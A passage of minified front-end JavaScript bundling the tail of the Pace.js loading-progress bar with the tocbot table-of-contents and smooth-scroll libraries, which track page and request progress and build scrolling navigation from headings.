    },
    x = function() {
        var e;
        return null != (e = "undefined" != typeof performance && null !== performance && "function" == typeof performance.now ? performance.now() : void 0) ? e : +new Date
    }
    ,
    E = window.requestAnimationFrame || window.mozRequestAnimationFrame || window.webkitRequestAnimationFrame || window.msRequestAnimationFrame,
    _ = window.cancelAnimationFrame || window.mozCancelAnimationFrame,
    null == E && (E = function(e) {
        return setTimeout(e, 50)
    }
    ,
    _ = function(e) {
        return clearTimeout(e)
    }
    ),
    C = function(t) {
        var n, i;
        return n = x(),
        (i = function() {
            var e;
            return 33 <= (e = x() - n) ? (n = x(),
            t(e, function() {
                return E(i)
            })) : setTimeout(i, 33 - e)
        }
        )()
    }
    ,
    j = function() {
        var e, t, n;
        return n = arguments[0],
        t = arguments[1],
        e = 3 <= arguments.length ? X.call(arguments, 2) : [],
        "function" == typeof n[t] ? n[t].apply(n, e) : n[t]
    }
    ,
    b = function() {
        var e, t, n, i, a, s, r;
        for (t = arguments[0],
        s = 0,
        r = (i = 2 <= arguments.length ? X.call(arguments, 1) : []).length; s < r; s++)
            if (n = i[s])
                for (e in n)
                    K.call(n, e) && (a = n[e],
                    null != t[e] && "object" == typeof t[e] && null != a && "object" == typeof a ? b(t[e], a) : t[e] = a);
        return t
    }
    ,
    p = function(e) {
        var t, n, i, a, s;
        for (n = t = 0,
        a = 0,
        s = e.length; a < s; a++)
            i = e[a],
            n += Math.abs(i),
            t++;
        return n / t
    }
    ,
    D = function(e, t) {
        var n, i;
        if (null == e && (e = "options"),
        null == t && (t = !0),
        i = document.querySelector("[data-pace-" + e + "]")) {
            if (n = i.getAttribute("data-pace-" + e),
            !t)
                return n;
            try {
                return JSON.parse(n)
            } catch (e) {
                return "undefined" != typeof console && null !== console ? console.error("Error parsing inline pace options", e) : void 0
            }
        }
    }
    ,
    Z.prototype.on = function(e, t, n, i) {
        var a;
        return null == i && (i = !1),
        null == this.bindings && (this.bindings = {}),
        null == (a = this.bindings)[e] && (a[e] = []),
        this.bindings[e].push({
            handler: t,
            ctx: n,
            once: i
        })
    }
    ,
    Z.prototype.once = function(e, t, n) {
        return this.on(e, t, n, !0)
    }
    ,
    Z.prototype.off = function(e, t) {
        var n, i, a;
        if (null != (null != (i = this.bindings) ? i[e] : void 0)) {
            if (null == t)
                return delete this.bindings[e];
            for (n = 0,
            a = []; n < this.bindings[e].length; )
                a.push(this.bindings[e][n].handler === t ? this.bindings[e].splice(n, 1) : n++);
            return a
        }
    }
    ,
    Z.prototype.trigger = function() {
        var e, t, n, i, a, s, r, o, l;
        if (n = arguments[0],
        e = 2 <= arguments.length ? X.call(arguments, 1) : [],
        null != (r = this.bindings) && r[n]) {
            for (a = 0,
            l = []; a < this.bindings[n].length; )
                i = (o = this.bindings[n][a]).handler,
                t = o.ctx,
                s = o.once,
                i.apply(null != t ? t : this, e),
                l.push(s ? this.bindings[n].splice(a, 1) : a++);
            return l
        }
    }
    ,
    a = Z,
    y = window.Pace || {},
    window.Pace = y,
    b(y, a.prototype),
    H = y.options = b({}, g, window.paceOptions, D()),
    $ = 0,
    q = (J = ["ajax", "document", "eventLag", "elements"]).length; $ < q; $++)
        !0 === H[N = J[$]] && (H[N] = g[N]);
    function Z() {}
    function ee(e) {
        this.source = e,
        this.last = this.sinceLastUpdate = 0,
        this.rate = H.initialRate,
        this.catchup = 0,
        this.progress = this.lastProgress = 0,
        null != this.source && (this.progress = j(this.source, "progress"))
    }
    function te() {
        var e, t, n = this;
        this.progress = null != (t = this.states[document.readyState]) ? t : 100,
        e = document.onreadystatechange,
        document.onreadystatechange = function() {
            return null != n.states[document.readyState] && (n.progress = n.states[document.readyState]),
            "function" == typeof e ? e.apply(null, arguments) : void 0
        }
    }
    function ne(e) {
        this.selector = e,
        this.progress = 0,
        this.check()
    }
    function ie() {
        var e = this;
        this.elements = [],
        Y().on("request", function() {
            return e.watch.apply(e, arguments)
        })
    }
    function ae() {
        var n, a = this;
        ae.__super__.constructor.apply(this, arguments),
        n = function(n) {
            var i;
            return i = n.open,
            n.open = function(e, t) {
                return O(e) && a.trigger("request", {
                    type: e,
                    url: t,
                    request: n
                }),
                i.apply(n, arguments)
            }
        }
        ,
        window.XMLHttpRequest = function(e) {
            var t;
            return t = new R(e),
            n(t),
            t
        }
        ;
        try {
            k(window.XMLHttpRequest, R)
        } catch (e) {}
        if (null != z) {
            window.XDomainRequest = function() {
                var e;
                return e = new z,
                n(e),
                e
            }
            ;
            try {
                k(window.XDomainRequest, z)
            } catch (e) {}
        }
        if (null != I && H.ajax.trackWebSockets) {
            window.WebSocket = function(e, t) {
                var n;
                return n = null != t ? new I(e,t) : new I(e),
                O("socket") && a.trigger("request", {
                    type: "socket",
                    url: e,
                    protocols: t,
                    request: n
                }),
                n
            }
            ;
            try {
                k(window.WebSocket, I)
            } catch (e) {}
        }
    }
    function se() {
        this.bindings = {}
    }
    function re() {
        this.progress = 0
    }
    function oe() {
        return oe.__super__.constructor.apply(this, arguments)
    }
    G = Error,
    e(oe, G),
    o = oe,
    re.prototype.getElement = function() {
        var e;
        if (null == this.el) {
            if (!(e = document.querySelector(H.target)))
                throw new o;
            this.el = document.createElement("div"),
            this.el.className = "pace pace-active",
            document.body.className = document.body.className.replace(/pace-done/g, ""),
            document.body.className += " pace-running",
            this.el.innerHTML = '<div class="pace-progress">\n  <div class="pace-progress-inner"></div>\n</div>\n<div class="pace-activity"></div>',
            null != e.firstChild ? e.insertBefore(this.el, e.firstChild) : e.appendChild(this.el)
        }
        return this.el
    }
    ,
    re.prototype.finish = function() {
        var e;
        return (e = this.getElement()).className = e.className.replace("pace-active", ""),
        e.className += " pace-inactive",
        document.body.className = document.body.className.replace("pace-running", ""),
        document.body.className += " pace-done"
    }
    ,
    re.prototype.update = function(e) {
        return this.progress = e,
        this.render()
    }
    ,
    re.prototype.destroy = function() {
        try {
            this.getElement().parentNode.removeChild(this.getElement())
        } catch (e) {
            o = e
        }
        return this.el = void 0
    }
    ,
    re.prototype.render = function() {
        var e, t, n, i, a, s, r;
        if (null == document.querySelector(H.target))
            return !1;
        for (e = this.getElement(),
        i = "translate3d(" + this.progress + "%, 0, 0)",
        a = 0,
        s = (r = ["webkitTransform", "msTransform", "transform"]).length; a < s; a++)
            t = r[a],
            e.children[0].style[t] = i;
        return (!this.lastRenderedProgress || this.lastRenderedProgress | 0 !== this.progress | 0) && (e.children[0].setAttribute("data-progress-text", (0 | this.progress) + "%"),
        100 <= this.progress ? n = "99" : (n = this.progress < 10 ? "0" : "",
        n += 0 | this.progress),
        e.children[0].setAttribute("data-progress", "" + n)),
        this.lastRenderedProgress = this.progress
    }
    ,
    re.prototype.done = function() {
        return 100 <= this.progress
    }
    ,
    d = re,
    se.prototype.trigger = function(e, t) {
        var n, i, a, s, r;
        if (null != this.bindings[e]) {
            for (r = [],
            i = 0,
            a = (s = this.bindings[e]).length; i < a; i++)
                n = s[i],
                r.push(n.call(this, t));
            return r
        }
    }
    ,
    se.prototype.on = function(e, t) {
        var n;
        return null == (n = this.bindings)[e] && (n[e] = []),
        this.bindings[e].push(t)
    }
    ,
    r = se,
    R = window.XMLHttpRequest,
    z = window.XDomainRequest,
    I = window.WebSocket,
    k = function(e, t) {
        var n, i, a;
        for (n in a = [],
        t.prototype)
            try {
                i = t.prototype[n],
                a.push(null == e[n] && "function" != typeof i ? e[n] = i : void 0)
            } catch (e) {
                0
            }
        return a
    }
    ,
    T = [],
    y.ignore = function() {
        var e, t, n;
        return t = arguments[0],
        e = 2 <= arguments.length ? X.call(arguments, 1) : [],
        T.unshift("ignore"),
        n = t.apply(null, e),
        T.shift(),
        n
    }
    ,
    y.track = function() {
        var e, t, n;
        return t = arguments[0],
        e = 2 <= arguments.length ? X.call(arguments, 1) : [],
        T.unshift("track"),
        n = t.apply(null, e),
        T.shift(),
        n
    }
    ,
    O = function(e) {
        var t;
        if (null == e && (e = "GET"),
        "track" === T[0])
            return "force";
        if (!T.length && H.ajax) {
            if ("socket" === e && H.ajax.trackWebSockets)
                return !0;
            if (t = e.toUpperCase(),
            0 <= Q.call(H.ajax.trackMethods, t))
                return !0
        }
        return !1
    }
    ,
    e(ae, r),
    u = ae,
    B = null,
    P = function(e) {
        var t, n, i, a;
        for (n = 0,
        i = (a = H.ajax.ignoreURLs).length; n < i; n++)
            if ("string" == typeof (t = a[n])) {
                if (-1 !== e.indexOf(t))
                    return !0
            } else if (t.test(e))
                return !0;
        return !1
    }
    ,
    (Y = function() {
        return null == B && (B = new u),
        B
    }
    )().on("request", function(e) {
        var t, s, r, o, n;
        return o = e.type,
        r = e.request,
        n = e.url,
        P(n) || y.running || !1 === H.restartOnRequestAfter && "force" !== O(o) ? void 0 : (s = arguments,
        "boolean" == typeof (t = H.restartOnRequestAfter || 0) && (t = 0),
        setTimeout(function() {
            var e, t, n, i, a;
            if ("socket" === o ? r.readyState < 2 : 0 < (n = r.readyState) && n < 4) {
                for (y.restart(),
                a = [],
                e = 0,
                t = (i = y.sources).length; e < t; e++) {
                    if ((N = i[e])instanceof l) {
                        N.watch.apply(N, s);
                        break
                    }
                    a.push(void 0)
                }
                return a
            }
        }, t))
    }),
    ie.prototype.watch = function(e) {
        var t, n, i, a;
        return i = e.type,
        t = e.request,
        a = e.url,
        P(a) ? void 0 : (n = new ("socket" === i ? h : m)(t),
        this.elements.push(n))
    }
    ,
    l = ie,
    m = function(t) {
        var e, n, i, a, s, r = this;
        if (this.progress = 0,
        null != window.ProgressEvent)
            for (t.addEventListener("progress", function(e) {
                return r.progress = e.lengthComputable ? 100 * e.loaded / e.total : r.progress + (100 - r.progress) / 2
            }, !1),
            n = 0,
            i = (s = ["load", "abort", "timeout", "error"]).length; n < i; n++)
                e = s[n],
                t.addEventListener(e, function() {
                    return r.progress = 100
                }, !1);
        else
            a = t.onreadystatechange,
            t.onreadystatechange = function() {
                var e;
                return 0 === (e = t.readyState) || 4 === e ? r.progress = 100 : 3 === t.readyState && (r.progress = 50),
                "function" == typeof a ? a.apply(null, arguments) : void 0
            }
    }
    ,
    h = function(e) {
        var t, n, i, a, s = this;
        for (n = this.progress = 0,
        i = (a = ["error", "open"]).length; n < i; n++)
            t = a[n],
            e.addEventListener(t, function() {
                return s.progress = 100
            }, !1)
    }
    ,
    n = function(e) {
        var t, n, i, a;
        for (null == e && (e = {}),
        this.elements = [],
        null == e.selectors && (e.selectors = []),
        n = 0,
        i = (a = e.selectors).length; n < i; n++)
            t = a[n],
            this.elements.push(new s(t))
    }
    ,
    ne.prototype.check = function() {
        var e = this;
        return document.querySelector(this.selector) ? this.done() : setTimeout(function() {
            return e.check()
        }, H.elements.checkInterval)
    }
    ,
    ne.prototype.done = function() {
        return this.progress = 100
    }
    ,
    s = ne,
    te.prototype.states = {
        loading: 0,
        interactive: 50,
        complete: 100
    },
    t = te,
    i = function() {
        var t, n, i, a, s, r = this;
        this.progress = 0,
        s = [],
        a = t = 0,
        i = x(),
        n = setInterval(function() {
            var e;
            return e = x() - i - 50,
            i = x(),
            s.push(e),
            s.length > H.eventLag.sampleCount && s.shift(),
            t = p(s),
            ++a >= H.eventLag.minSamples && t < H.eventLag.lagThreshold ? (r.progress = 100,
            clearInterval(n)) : r.progress = 3 / (t + 3) * 100
        }, 50)
    }
    ,
    ee.prototype.tick = function(e, t) {
        var n;
        return null == t && (t = j(this.source, "progress")),
        100 <= t && (this.done = !0),
        t === this.last ? this.sinceLastUpdate += e : (this.sinceLastUpdate && (this.rate = (t - this.last) / this.sinceLastUpdate),
        this.catchup = (t - this.progress) / H.catchupTime,
        this.sinceLastUpdate = 0,
        this.last = t),
        t > this.progress && (this.progress += this.catchup * e),
        n = 1 - Math.pow(this.progress / 100, H.easeFactor),
        this.progress += n * this.rate * e,
        this.progress = Math.min(this.lastProgress + H.maxProgressPerFrame, this.progress),
        this.progress = Math.max(0, this.progress),
        this.progress = Math.min(100, this.progress),
        this.lastProgress = this.progress,
        this.progress
    }
    ,
    v = ee,
    L = f = W = M = A = F = null,
    y.running = !1,
    w = function() {
        return H.restartOnPushState ? y.restart() : void 0
    }
    ,
    null != window.history.pushState && (U = window.history.pushState,
    window.history.pushState = function() {
        return w(),
        U.apply(window.history, arguments)
    }
    ),
    null != window.history.replaceState && (V = window.history.replaceState,
    window.history.replaceState = function() {
        return w(),
        V.apply(window.history, arguments)
    }
    ),
    c = {
        ajax: l,
        elements: n,
        document: t,
        eventLag: i
    },
    (S = function() {
        var e, t, n, i, a, s, r, o;
        for (y.sources = F = [],
        t = 0,
        i = (s = ["ajax", "elements", "document", "eventLag"]).length; t < i; t++)
            !1 !== H[e = s[t]] && F.push(new c[e](H[e]));
        for (n = 0,
        a = (o = null != (r = H.extraSources) ? r : []).length; n < a; n++)
            N = o[n],
            F.push(new N(H));
        return y.bar = M = new d,
        A = [],
        W = new v
    }
    )(),
    y.stop = function() {
        return y.trigger("stop"),
        y.running = !1,
        M.destroy(),
        L = !0,
        null != f && ("function" == typeof _ && _(f),
        f = null),
        S()
    }
    ,
    y.restart = function() {
        return y.trigger("restart"),
        y.stop(),
        y.start()
    }
    ,
    y.go = function() {
        var g;
        return y.running = !0,
        M.render(),
        g = x(),
        L = !1,
        f = C(function(e, t) {
            var n, i, a, s, r, o, l, d, u, c, h, m, f, p, _;
            for (M.progress,
            i = c = 0,
            a = !0,
            o = h = 0,
            f = F.length; h < f; o = ++h)
                for (N = F[o],
                u = null != A[o] ? A[o] : A[o] = [],
                l = m = 0,
                p = (r = null != (_ = N.elements) ? _ : [N]).length; m < p; l = ++m)
                    s = r[l],
                    a &= (d = null != u[l] ? u[l] : u[l] = new v(s)).done,
                    d.done || (i++,
                    c += d.tick(e));
            return n = c / i,
            M.update(W.tick(e, n)),
            M.done() || a || L ? (M.update(100),
            y.trigger("done"),
            setTimeout(function() {
                return M.finish(),
                y.running = !1,
                y.trigger("hide")
            }, Math.max(H.ghostTime, Math.max(H.minTime - (x() - g), 0)))) : t()
        })
    }
    ,
    y.start = function(e) {
        b(H, e),
        y.running = !0;
        try {
            M.render()
        } catch (e) {
            o = e
        }
        return document.querySelector(".pace") ? (y.trigger("start"),
        y.go()) : setTimeout(y.start, 50)
    }
    ,
    "function" == typeof define && define.amd ? define(function() {
        return y
    }) : "object" == typeof exports ? module.exports = y : H.startOnPageLoad && y.start()
}
.call(this),
function(n) {
    function i(e) {
        if (a[e])
            return a[e].exports;
        var t = a[e] = {
            exports: {},
            id: e,
            loaded: !1
        };
        return n[e].call(t.exports, t, t.exports, i),
        t.loaded = !0,
        t.exports
    }
    var a = {};
    i.m = n,
    i.c = a,
    i.p = "",
    i(0)
}([function(n, i, _) {
    var a, s, r;
    (function(e) {
        var t;
        t = void 0 !== e ? e : this.window || this.global,
        s = [],
        a = function(e) {
            "use strict";
            function i() {
                for (var e = {}, t = 0; t < arguments.length; t++) {
                    var n = arguments[t];
                    for (var i in n)
                        p.call(n, i) && (e[i] = n[i])
                }
                return e
            }
            function a(i, a, s) {
                a || (a = 250);
                var r, o;
                return function() {
                    var e = s || this
                      , t = +new Date
                      , n = arguments;
                    r && t < r + a ? (clearTimeout(o),
                    o = setTimeout(function() {
                        r = t,
                        i.apply(e, n)
                    }, a)) : (r = t,
                    i.apply(e, n))
                }
            }
            var s, r, o, l = _(1), d = _(2), u = {}, c = {}, h = _(3), m = _(4), f = (e.document,
            document.body,
            !!e.document.querySelector && !!e.addEventListener), p = Object.prototype.hasOwnProperty;
            return c.destroy = function() {
                try {
                    document.querySelector(u.tocSelector).innerHTML = ""
                } catch (e) {
                    console.warn("Element not found: " + u.tocSelector)
                }
                document.removeEventListener("scroll", this._scrollListener, !1),
                document.removeEventListener("resize", this._scrollListener, !1),
                s && document.removeEventListener("click", this._clickListener, !1),
                l && l.destroy()
            }
            ,
            c.init = function(e) {
                if (f && (u = i(d, e || {}),
                this.options = u,
                this.state = {},
                s = h(u),
                r = m(u),
                this._buildHtml = s,
                this._parseContent = r,
                c.destroy(),
                o = r.selectHeadings(u.contentSelector, u.headingSelector),
                null !== o)) {
                    var t = r.nestHeadingsArray(o)
                      , n = t.nest;
                    return s.render(u.tocSelector, n),
                    this._scrollListener = a(function() {
                        s.updateToc(o)
                    }, u.throttleTimeout),
                    this._scrollListener(),
                    document.addEventListener("scroll", this._scrollListener, !1),
                    document.addEventListener("resize", this._scrollListener, !1),
                    this._clickListener = a(function(e) {
                        s.disableTocAnimation(e),
                        s.updateToc(o)
                    }, u.throttleTimeout),
                    document.addEventListener("click", this._clickListener, !1),
                    l && (this.smoothScroll = l.init(i(u.smoothScrollOptions, {
                        callback: s.enableTocAnimation
                    }))),
                    this
                }
            }
            ,
            c.refresh = function(e) {
                c.destroy(),
                c.init(e || this.options)
            }
            ,
            e.tocbot = c
        }(t),
        void 0 === (r = "function" == typeof a ? a.apply(i, s) : a) || (n.exports = r)
    }
    ).call(i, function() {
        return this
    }())
}
, function(n, i, e) {
    var a, s, r;
    (function(e) {
        var t;
        t = void 0 !== e ? e : this.window || this.global,
        s = [],
        a = function(g) {
            "use strict";
            var y, i, a, v, M, t, L, n = {}, s = "querySelector"in document && "addEventListener"in g, b = {
                selector: "[data-scroll]",
                selectorHeader: null,
                speed: 500,
                easing: "easeInOutCubic",
                offset: 0,
                callback: function() {}
            }, k = function() {
                var n = {}
                  , i = !1
                  , e = 0
                  , t = arguments.length;
                "[object Boolean]" === Object.prototype.toString.call(arguments[0]) && (i = arguments[0],
                e++);
                for (var a = function(e) {
                    for (var t in e)
                        Object.prototype.hasOwnProperty.call(e, t) && (i && "[object Object]" === Object.prototype.toString.call(e[t]) ? n[t] = k(!0, n[t], e[t]) : n[t] = e[t])
                }; e < t; e++) {
                    var s = arguments[e];
                    a(s)
                }
                return n
            }, r = function(e) {
                return Math.max(e.scrollHeight, e.offsetHeight, e.clientHeight)
            }, o = function(e, t) {
                for (Element.prototype.matches || (Element.prototype.matches = Element.prototype.matchesSelector || Element.prototype.mozMatchesSelector || Element.prototype.msMatchesSelector || Element.prototype.oMatchesSelector || Element.prototype.webkitMatchesSelector || function(e) {
                    for (var t = (this.document || this.ownerDocument).querySelectorAll(e), n = t.length; --n >= 0 && t.item(n) !== this; )
                        ;
                    return n > -1
                }
                ); e && e !== document; e = e.parentNode)
                    if (e.matches(t))
                        return e;
                return null
            }, l = function(e) {
                "#" === e.charAt(0) && (e = e.substr(1));
                for (var t, n = String(e), i = n.length, a = -1, s = "", r = n.charCodeAt(0); ++a < i; ) {
                    if (t = n.charCodeAt(a),
                    0 === t)
                        throw new InvalidCharacterError("Invalid character: the input contains U+0000.");
                    s += t >= 1 && t <= 31 || 127 == t || 0 === a && t >= 48 && t <= 57 || 1 === a && t >= 48 && t <= 57 && 45 === r ? "\\" + t.toString(16) + " " : t >= 128 || 45 === t || 95 === t || t >= 48 && t <= 57 || t >= 65 && t <= 90 || t >= 97 && t <= 122 ? n.charAt(a) : "\\" + n.charAt(a)
                }
                return "#" + s
            }, D = function(e, t) {
                var n;
                return "easeInQuad" === e && (n = t * t),
                "easeOutQuad" === e && (n = t * (2 - t)),
                "easeInOutQuad" === e && (n = t < .5 ? 2 * t * t : -1 + (4 - 2 * t) * t),
                "easeInCubic" === e && (n = t * t * t),
                "easeOutCubic" === e && (n = --t * t * t + 1),
                "easeInOutCubic" === e && (n = t < .5 ? 4 * t * t * t : (t - 1) * (2 * t - 2) * (2 * t - 2) + 1),
                "easeInQuart" === e && (n = t * t * t * t),
                "easeOutQuart" === e && (n = 1 - --t * t * t * t),
                "easeInOutQuart" === e && (n = t < .5 ? 8 * t * t * t * t : 1 - 8 * --t * t * t * t),
                "easeInQuint" === e && (n = t * t * t * t * t),
                "easeOutQuint" === e && (n = 1 + --t * t * t * t * t),
                "easeInOutQuint" === e && (n = t < .5 ? 16 * t * t * t * t * t : 1 + 16 * --t * t * t * t * t),
                n || t
            }, Y = function(e, t, n) {
                var i = 0;
                if (e.offsetParent)
                    do {
                        i += e.offsetTop,
                        e = e.offsetParent
                    } while (e);return i = Math.max(i - t - n, 0),
                Math.min(i, w() - d())
            }, d = function() {
                return Math.max(document.documentElement.clientHeight, g.innerHeight || 0)
            }, w = function() {
                return Math.max(document.body.scrollHeight, document.documentElement.scrollHeight, document.body.offsetHeight, document.documentElement.offsetHeight, document.body.clientHeight, document.documentElement.clientHeight)
            }, T = function(e) {
                return e && "object" == typeof JSON && "function" == typeof JSON.parse ? JSON.parse(e) : {}
            }, S = function(e) {
                return e ? r(e) + e.offsetTop : 0
            }, x = function(e, t, n) {
                n || (e.focus(),
                document.activeElement.id !== e.id && (e.setAttribute("tabindex", "-1"),
                e.focus(),
                e.style.outline = "none"),
                g.scrollTo(0, t))
            };
            n.animateScroll = function(a, s, e) {
                var t = T(s ? s.getAttribute("data-options") : null)
                  , r = k(y || b, e || {}, t)
                  , o = "[object Number]" === Object.prototype.toString.call(a)
                  , n = o || !a.tagName ? null : a;
                if (o || n) {
                    var i = g.pageYOffset;
                    r.selectorHeader && !v && (v = document.querySelector(r.selectorHeader)),
                    M || (M = S(v));
                    var l, d, u = o ? a : Y(n, M, parseInt(r.offset, 10)), c = u - i, h = w(), m = 0, f = function(e, t, n) {
                        var i = g.pageYOffset;
                        (e == t || i == t || g.innerHeight + i >= h) && (clearInterval(n),
                        x(a, t, o),
                        r.callback(a, s))
                    }, p = function() {
                        m += 16,
                        l = m / parseInt(r.speed, 10),
                        l = l > 1 ? 1 : l,
                        d = i + c * D(r.easing, l),
                        g.scrollTo(0, Math.floor(d)),
                        f(d, u, L)
                    }, _ = function() {
                        clearInterval(L),
                        L = setInterval(p, 16)
                    };
                    0 === g.pageYOffset && g.scrollTo(0, 0),
                    _()
                }
            }
            ;
            var u = function(e) {
                var t;
                try {
                    t = l(decodeURIComponent(g.location.hash))
                } catch (e) {
                    t = l(g.location.hash)
                }
                i && (i.id = i.getAttribute("data-scroll-id"),
                n.animateScroll(i, a),
                i = null,
                a = null)
            }
              , c = function(e) {
                if (0 === e.button && !e.metaKey && !e.ctrlKey && (a = o(e.target, y.selector),
                a && "a" === a.tagName.toLowerCase() && a.hostname === g.location.hostname && a.pathname === g.location.pathname && /#/.test(a.href))) {
                    var t;
                    try {
                        t = l(decodeURIComponent(a.hash))
                    } catch (e) {
                        t = l(a.hash)
                    }
                    if ("#" === t) {
                        e.preventDefault(),
                        i = document.body;
                        var n = i.id ? i.id : "smooth-scroll-top";
                        return i.setAttribute("data-scroll-id", n),
                        i.id = "",
                        void (g.location.hash.substring(1) === n ? u() : g.location.hash = n)
                    }
                    i = document.querySelector(t),
                    i && (i.setAttribute("data-scroll-id", i.id),
                    i.id = "",
                    a.hash === g.location.hash && (e.preventDefault(),
                    u()))
                }
            }
              , h = function(e) {
                t || (t = setTimeout(function() {
                    t = null,
                    M = S(v)
                }, 66))
            };
            return n.destroy = function() {
                y && (document.removeEventListener("click", c, !1),
                g.removeEventListener("resize", h, !1),
                y = null,
                i = null,
                a = null,
                v = null,
                M = null,
                t = null,
                L = null)
            }
            ,
            n.init = function(e) {
                s && (n.destroy(),
                y = k(b, e || {}),
                v = y.selectorHeader ? document.querySelector(y.selectorHeader) : null,
                M = S(v),
                document.addEventListener("click", c, !1),
                g.addEventListener("hashchange", u, !1),
                v && g.addEventListener("resize", h, !1))
            }
            ,
            n
        }(t),
        void 0 === (r = "function" == typeof a ? a.apply(i, s) : a) || (n.exports = r)
    }
    ).call(i, function() {
        return this
    }())
}
, function(e, t) {
    e.exports = {
        tocSelector: ".js-toc",
        contentSelector: ".js-toc-content",
        headingSelector: "h1, h2, h3",
        ignoreSelector: ".js-toc-ignore",
        linkClass: "toc-link",
        extraLinkClasses: "",
        activeLinkClass: "is-active-link",
        listClass: "toc-list",
        extraListClasses: "",
        isCollapsedClass: "is-collapsed",
        collapsibleClass: "is-collapsible",
        listItemClass: "toc-list-item",
        collapseDepth: 0,
        smoothScrollOptions: {
            easing: "easeInOutCubic",
            offset: 0,
            speed: 300
        },
        headingsOffset: 0,
        throttleTimeout: 50,
        positionFixedSelector: null,
        positionFixedClass: "is-position-fixed",
        fixedSidebarOffset: "auto",
        includeHtml: !1
    }
}
, function(e, t) {
    e.exports = function(d) {
        function o(e, t) {
            var n, i, a, s = t.appendChild((n = e,
            i = document.createElement("li"),
            a = document.createElement("a"),
            d.listItemClass && i.setAttribute("class", d.listItemClass),
            d.includeHtml && n.childNodes.length ? u.call(n.childNodes, function(e) {
                a.appendChild(e.cloneNode(!0))
            }) : a.textContent = n.textContent,
            a.setAttribute("data-scroll", ""),
            a.setAttribute("href", "#" + n.id),
            a.setAttribute("class", d.linkClass + f + "node-name--" + n.nodeName + f + d.extraLinkClasses),
            i.appendChild(a),
            i));
            if (e.children.length) {
                var r = l(e.isCollapsed);
                e.children.forEach(function(e) {
                    o(e, r)
                }),
                s.appendChild(r)
            }
        }
        function l(e) {
            var t = document.createElement("ul")
              , n = d.listClass + f + d.extraListClasses;
            return e && (n += f + d.collapsibleClass,
            n += f + d.isCollapsedClass),
            t.setAttribute("class", n),
            t
        }
        var u = [].forEach
          , c = [].some
          , h = document.body
          , m = !0
          , f = " ";
        return {
            enableTocAnimation: function() {
                m = !0
            },
            disableTocAnimation: function(e) {
                var t = e.target || e.srcElement;
                "string" == typeof t.className && -1 !== t.className.indexOf(d.linkClass) && (m = !1)
            },
            render: function(e, t) {
                var n = l(!1);
                t.forEach(function(e) {
                    o(e, n)
                });
                var i = document.querySelector(e);
                if (null !== i)
                    return i.firstChild && i.removeChild(i.firstChild),
                    i.appendChild(n)
            },
            updateToc: function(e) {
                var t, n, i = document.documentElement.scrollTop || h.scrollTop;
                d.positionFixedSelector && (t = document.documentElement.scrollTop || h.scrollTop,
                n = document.querySelector(d.positionFixedSelector),
                "auto" === d.fixedSidebarOffset && (d.fixedSidebarOffset = document.querySelector(d.tocSelector).offsetTop),
                t > d.fixedSidebarOffset ? -1 === n.className.indexOf(d.positionFixedClass) && (n.className += f + d.positionFixedClass) : n.className = n.className.split(f + d.positionFixedClass).join(""));
                var a, s = e;
                if (m && null !== document.querySelector(d.tocSelector) && 0 < s.length) {
                    c.call(s, function(e, t) {
                        return e.offsetTop > i + d.headingsOffset + 1 ? (a = s[0 === t ? t : t - 1],
                        !0) : t === s.length - 1 ? (a = s[s.length - 1],
                        !0) : void 0
                    });
                    var r = document.querySelector(d.tocSelector).querySelectorAll("." + d.linkClass);
                    u.call(r, function(e) {
                        e.className = e.className.split(f + d.activeLinkClass).join("")
                    });
                    var o = document.querySelector(d.tocSelector).querySelector("." + d.linkClass + ".node-name--" + a.nodeName + '[href="#' + a.id + '"]');
                    o.className += f + d.activeLinkClass;
                    var l = document.querySelector(d.tocSelector).querySelectorAll("." + d.listClass + "." + d.collapsibleClass);
                    u.call(l, function(e) {
                        var t = f + d.isCollapsedClass;
                        -1 === e.className.indexOf(t) && (e.className += f + d.isCollapsedClass)
                    }),
                    o.nextSibling && (o.nextSibling.className = o.nextSibling.className.split(f + d.isCollapsedClass).join("")),
                    function e(t) {
                        return -1 !== t.className.indexOf(d.collapsibleClass) ? (t.className = t.className.split(f + d.isCollapsedClass).join(""),
                        e(t.parentNode.parentNode)) : t
                    }(o.parentNode.parentNode)
                }
            }
        }
    }
}
, function(e, t) {
    e.exports = function(o) {
        function l(e) {
            return e[e.length - 1]
        }
        function d(e) {
            return +e.nodeName.split("H").join("")
        }
        function u(e) {
            var t = {
                id: e.id,
                children: [],
                nodeName: e.nodeName,
                headingLevel: d(e),
                textContent: e.textContent.trim()
            };
            return o.includeHtml && (t.childNodes = e.childNodes),
            t
        }
        var t = [].reduce;
        return {
            nestHeadingsArray: function(e) {
                return t.call(e, function(e, t) {
                    return function(e, t) {
                        for (var n = u(e), i = d(e), a = t, s = l(a), r = i - (s ? s.headingLevel : 0); 0 < r; )
                            (s = l(a)) && void 0 !== s.children && (a = s.children),
                            r--;
                        i >= o.collapseDepth && (n.isCollapsed = !0),
                        a.push(n)
                    }(u(t), e.nest),
                    e
                }, {
                    nest: []
                })
            },
            selectHeadings: function(t, e) {
                var n = e;
                o.ignoreSelector && (n = e.split(",").map(function(e) {
                    return e.trim() + ":not(" + o.ignoreSelector + ")"
                }));
                try {
                    return document.querySelector(t).querySelectorAll(n)
                } catch (e) {
                    return console.warn("Element not found: " + t),
                    null
                }
            }
        }
    }
}
]);
